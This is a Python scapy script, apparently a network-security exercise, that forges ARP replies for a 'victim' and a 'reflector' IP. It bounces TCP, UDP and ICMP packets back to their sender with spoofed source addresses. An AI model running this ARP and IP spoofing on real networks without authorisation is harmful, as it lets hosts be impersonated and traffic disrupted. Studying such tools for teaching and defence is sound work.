#!/usr/bin/env python3
import argparse
import ipaddress
from scapy.all import *
import logging
import os
from functools import partial
from collections import Counter
'''
#./reflector --interface eth0 --victim-ip 192.168.1.10  --victim-ethernet 31:16:A9:63:FF:83 --reflector-ip 192.168.1.20 --reflector-ethernet 38:45:E3:89:B5:56
a = Ether(src='31:16:A9:63:FF:83', dst='ff:ff:ff:ff:ff:ff')/ARP(op=ARP.is_at, hwsrc='31:16:A9:63:FF:83', psrc='192.168.1.10')
'''

# define class Reflector


class Reflector:
    def __init__(self, iface, v_ip, v_mac, r_ip, r_mac):
        self.iface = iface
        self.v_ip = v_ip
        self.v_mac = v_mac
        self.r_ip = r_ip
        self.r_mac = r_mac

# handle incoming packet
    def handle_packets(self, pkt):
        # ARP request for victim ip
        if ARP in pkt and pkt[ARP].pdst == self.v_ip and pkt[ARP].op == 1:
            # reply = Ether()/ARP()
            # reply.dst = pkt[Ether].src
            # reply.src = self.v_mac
            # reply.type = 0x806
            # reply.hwtype = 0x1
            # reply.ptype = 0x800
            # reply.hwlen = 6
            # reply.plen = 4
            # reply.op = 2  # is-at
            # reply.hwsrc = self.v_mac
            # reply.hwdst = pkt[ARP].hwsrc
            # reply.psrc = self.v_ip
            # reply.pdst = pkt.psrc
            # sendp(reply, iface=self.iface)
            pkt[Ether].dst = pkt[Ether].src
            pkt[Ether].src = self.v_mac
            pkt[ARP].op = 2
            pkt[ARP].hwdst = pkt[ARP].hwsrc
            pkt[ARP].pdst = pkt[ARP].psrc
            pkt[ARP].hwsrc = self.v_mac
            pkt[ARP].psrc = self.v_ip
            sendp(pkt, iface=self.iface)
        # ARP request for reflector ip
        elif ARP in pkt and pkt[ARP].pdst == self.r_ip and pkt[ARP].op == 1:
            # reply = Ether()/ARP()
            # reply.dst = pkt[Ether].src
            # reply.src = self.r_mac
            # reply.type = 0x806
            # reply.hwtype = 0x1
            # reply.ptype = 0x800
            # reply.hwlen = 6
            # reply.plen = 4
            # reply.op = 2  # is-at
            # reply.hwsrc = self.r_mac
            # reply.hwdst = pkt[ARP].hwsrc
            # reply.psrc = self.r_ip
            # reply.pdst = pkt.psrc
            # sendp(reply, iface=self.iface)
            pkt[Ether].dst = pkt[Ether].src
            pkt[Ether].src = self.r_mac
            pkt[ARP].op = 2
            pkt[ARP].hwdst = pkt[ARP].hwsrc
            pkt[ARP].pdst = pkt[ARP].psrc
            pkt[ARP].hwsrc = self.r_mac
            pkt[ARP].psrc = self.r_ip
            sendp(pkt, iface=self.iface)
        elif TCP in pkt and pkt[IP].dst == self.r_ip:
            a_mac = pkt[Ether].src
            a_ip = pkt[IP].src
            pkt[Ether].dst = a_mac
            pkt[Ether].src = self.v_mac
            pkt[IP].dst = a_ip
            pkt[IP].src = self.v_ip
            del pkt[IP].chksum
            del pkt[TCP].chksum
            pkt = pkt.__class__(bytes(pkt))
            sendp(pkt, iface=self.iface)
        elif TCP in pkt and pkt[IP].dst == self.v_ip:
            a_mac = pkt[Ether].src
            a_ip = pkt[IP].src
            pkt[Ether].dst = a_mac
            pkt[Ether].src = self.r_mac
            pkt[IP].dst = a_ip
            pkt[IP].src = self.r_ip
            del pkt[IP].chksum
            del pkt[TCP].chksum
            pkt = pkt.__class__(bytes(pkt))
            sendp(pkt, iface=self.iface)
        # attack send UDP to victim
        elif UDP in pkt and pkt[IP].dst == self.v_ip:
            a_mac = pkt[Ether].src
            a_ip = pkt[IP].src
            pkt[Ether].dst = a_mac
            pkt[Ether].src = self.r_mac
            pkt[IP].dst = a_ip
            pkt[IP].src = self.r_ip
            del pkt[IP].chksum
            del pkt[UDP].chksum
            pkt = pkt.__class__(bytes(pkt))
            sendp(pkt, iface=self.iface)
        # attack send UDP to victim
        elif UDP in pkt and pkt[IP].dst == self.r_ip:
            a_mac = pkt[Ether].src
            a_ip = pkt[IP].src
            pkt[Ether].dst = a_mac
            pkt[Ether].src = self.v_mac
            pkt[IP].dst = a_ip
            pkt[IP].src = self.v_ip
            del pkt[IP].chksum
            del pkt[UDP].chksum
            pkt = pkt.__class__(bytes(pkt))
            sendp(pkt, iface=self.iface)
        elif ICMP in pkt and pkt[IP].dst == self.v_ip and pkt[ICMP].type == 8:
            a_mac = pkt[Ether].src
            a_ip = pkt[IP].src
            pkt[Ether].dst = a_mac
            pkt[Ether].src = self.r_mac
            pkt[IP].dst = a_ip
            pkt[IP].src = self.r_ip
            # pkt[Ether].dst = pkt[Ether].src
            # pkt[Ether].src = self.v_mac
            # pkt[IP].dst = pkt[IP].src
            # pkt[IP].src = self.v_ip
            pkt[ICMP].type = 0
            del pkt[IP].chksum
            del pkt[ICMP].chksum
            # pkt = pkt.__class__(bytes(pkt))
            sendp(pkt, iface=self.iface)
        elif ICMP in pkt and pkt[IP].dst == self.r_ip and pkt[ICMP].type == 8:
            a_mac = pkt[Ether].src
            a_ip = pkt[IP].src
            pkt[Ether].dst = a_mac
            pkt[Ether].src = self.v_mac
            pkt[IP].dst = a_ip
            pkt[IP].src = self.v_ip
            # pkt[Ether].dst = pkt[Ether].src
            # pkt[Ether].src = self.r_mac
            # pkt[IP].dst = pkt[IP].src
            # pkt[IP].src = self.r_ip
            pkt[ICMP].type = 0
            del pkt[IP].chksum
            del pkt[ICMP].chksum
            # pkt = pkt.__class__(bytes(pkt))
            sendp(pkt, iface=self.iface)

    def run(self):
        sniff(iface=self.iface, prn=self.handle_packets, store=0)


def main():
    parser = argparse.ArgumentParser(description="reflector")
    parser.add_argument(
        '--interface', help="listening network interface", dest='interface', required=True)
    parser.add_argument('--victim-ip', type=ipaddress.ip_address,
                        help="victim ip address", dest='v_ip', required=True)
    parser.add_argument('--victim-ethernet',
                        help="victim MAC address", dest='v_mac', required=True)
    parser.add_argument('--reflector-ip', type=ipaddress.ip_address,
                        help="reflector ip address", dest='r_ip', required=True)
    parser.add_argument('--reflector-ethernet',
                        help="reflector MAC address", dest='r_mac', required=True)
    args = parser.parse_args()
    #print(f"interface is {args.interface}, victim ip is {args.v_ip}, victim mac is {args.v_mac}, reflector ip is {args.r_ip}, reflector mac is {args.r_mac}")
    # enabling ip forwarding
    #os.system('echo 1 > /proc/sys/net/ipv4/ip_forward')
    # sniff incoming packets
    reflector = Reflector(str(args.interface), str(args.v_ip), str(
        args.v_mac), str(args.r_ip), str(args.r_mac))
    reflector.run()


if __name__ == "__main__":
    # logging.getLogger("scapy").setLevel(logging.INFO)
    try:
        main()
    except KeyboardInterrupt:
        print("Exiting...")
        # disabling ip forwarding
        #os.system('echo 0 > /proc/sys/net/ipv4/ip_forward')
        sys.exit(0)
